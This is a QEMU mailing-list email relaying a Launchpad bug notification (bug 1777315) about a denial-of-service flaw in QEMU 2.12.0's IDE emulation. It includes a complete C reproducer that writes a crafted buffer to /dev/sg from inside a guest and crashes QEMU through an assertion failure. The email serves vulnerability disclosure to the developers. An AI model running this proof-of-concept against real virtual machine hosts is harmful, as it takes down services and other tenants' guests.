Received: from eggs.gnu.org ([2001:4830:134:3::10]:34063)
	by lists.gnu.org with esmtp (Exim 4.71)
	(envelope-from <bounces@canonical.com>) id 1fVHC3-0002Iu-LF
	for qemu-devel@nongnu.org; Tue, 19 Jun 2018 10:01:13 -0400
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
	(envelope-from <bounces@canonical.com>) id 1fVHBx-0006qP-Qv
	for qemu-devel@nongnu.org; Tue, 19 Jun 2018 10:01:11 -0400
Received: from indium.canonical.com ([91.189.90.7]:56206)
	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
	(Exim 4.71) (envelope-from <bounces@canonical.com>)
	id 1fVHBx-0006oO-J7
	for qemu-devel@nongnu.org; Tue, 19 Jun 2018 10:01:05 -0400
Received: from loganberry.canonical.com ([91.189.90.37])
	by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
	id 1fVHBv-0006Mr-S6
	for <qemu-devel@nongnu.org>; Tue, 19 Jun 2018 14:01:03 +0000
Received: from loganberry.canonical.com (localhost [127.0.0.1])
	by loganberry.canonical.com (Postfix) with ESMTP id C8E5E2E80CB
	for <qemu-devel@nongnu.org>; Tue, 19 Jun 2018 14:01:03 +0000 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
Date: Tue, 19 Jun 2018 13:55:20 -0000
From: John Snow <1777315@bugs.launchpad.net>
Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
Sender: bounces@canonical.com
References: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
Message-Id: <152941652147.2457.9952856305693445258.launchpad@chaenomeles.canonical.com>
Errors-To: bounces@canonical.com
Subject: [Qemu-devel] [Bug 1777315] Re: Denial of service
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <http://lists.nongnu.org/archive/html/qemu-devel/>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
To: qemu-devel@nongnu.org

** Changed in: qemu
     Assignee: (unassigned) =3D> John Snow (jnsnow)

** Changed in: qemu
       Status: New =3D> In Progress

-- =

You received this bug notification because you are a member of qemu-
devel-ml, which is subscribed to QEMU.
https://bugs.launchpad.net/bugs/1777315

Title:
  Denial of service

Status in QEMU:
  In Progress

Bug description:
  Hi,
  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
2.12.0

  run the program in qemu-2.12.0:
  #define _GNU_SOURCE =

  #include <endian.h>
  #include <sys/syscall.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <stdio.h>
  #include <string.h>
  #include <sys/stat.h>
  #include <stdint.h>
  #include <string.h>

  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
  {
          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
                  char buf[128];
                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
lock", (uint8_t)a1, (uint8_t)a2);
                  return open(buf, O_RDWR, 0);
          } else {
                  char buf[1024];
                  char* hash;
  strncpy(buf, (char*)a0, sizeof(buf) - 1);
                  buf[sizeof(buf) - 1] =3D 0;
                  while ((hash =3D strchr(buf, '#'))) {
                          *hash =3D '0' + (char)(a1 % 10);
                          a1 /=3D 10;
                  }
                  return open(buf, a2, 0);
          }
  }

  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
  void loop()
  {
          long res =3D 0;
  memcpy((void*)0x20000000, "/dev/sg#", 9);
          res =3D syz_open_dev(0x20000000, 0, 2);
          if (res !=3D -1)
                  r[0] =3D res;
          res =3D syscall(__NR_dup2, r[0], r[0]);
          if (res !=3D -1)
                  r[1] =3D res;
  *(uint8_t*)0x20000ec0 =3D 0;
  *(uint8_t*)0x20000ec1 =3D 0;
  *(uint8_t*)0x20000ec2 =3D 0;
  *(uint8_t*)0x20000ec3 =3D 0;
  *(uint32_t*)0x20000ec8 =3D 0;
  *(uint8_t*)0x20000ed8 =3D 0;
  *(uint8_t*)0x20000ed9 =3D 0;
  *(uint8_t*)0x20000eda =3D 0;
  *(uint8_t*)0x20000edb =3D 0;
  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
b3", 12);
          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
  }

  int main()
  {
          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
          loop();
          return 0;
  }
  this will crash qemu, output information:
   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
=3D=3D s->sg.size' failed.

  =

  Thanks =

  owl337

To manage notifications about this bug go to:
https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions
